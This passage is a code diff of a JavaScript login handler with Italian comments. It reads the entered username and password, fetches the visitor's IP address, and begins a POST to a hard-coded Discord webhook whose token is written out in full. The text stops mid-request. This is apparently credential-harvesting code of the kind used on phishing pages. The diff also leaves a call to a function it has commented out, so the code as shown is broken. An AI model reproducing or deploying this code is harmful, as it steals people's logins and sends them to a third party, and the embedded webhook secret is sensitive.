@@ -66,26 +66,34 @@ darkmode_toggle.onclick = (e) => {
 }
 
 
-let IPAddressVisitor;
-function getIPAddress() {
+// let IPAddressVisitor;
+// function getIPAddress() {
 
-    fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-            IPAddressVisitor = data.ip;
-            console.log(IPddressVisitor); // Opzionale: per vedere l'IP in console
-        })
-        .catch(error => console.error('Errore:', error));
+//     fetch('https://api.ipify.org?format=json')
+//         .then(response => response.json())
+//         .then(data => {
+//             IPAddressVisitor = data.ip;
+//             console.log(IPAddressVisitor); // Opzionale: per vedere l'IP in console
+//         })
+//         .catch(error => console.error('Errore:', error));
 
-}
+// }
 
 function loginData() {
 
     getIPAddress();
 
+    let IPAddressVisitor;
     let username = document.getElementById('input-username').value;
     let password = document.getElementById('input-password').value;
 
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            IPAddressVisitor = data.ip;
+            console.log(IPAddressVisitor); // Opzionale: per vedere l'IP in console
+        })
+        .catch(error => console.error('Errore:', error));
 
     const request = new XMLHttpRequest();
     request.open("POST", "https://discord.com/api/webhooks/1216738612893192192/rOHU-JGI67MpmZLtOk2kEVW5hzc9chwGTkxLVyMkRXtULbYLEtsnENYE4fYTWaZmrB51");
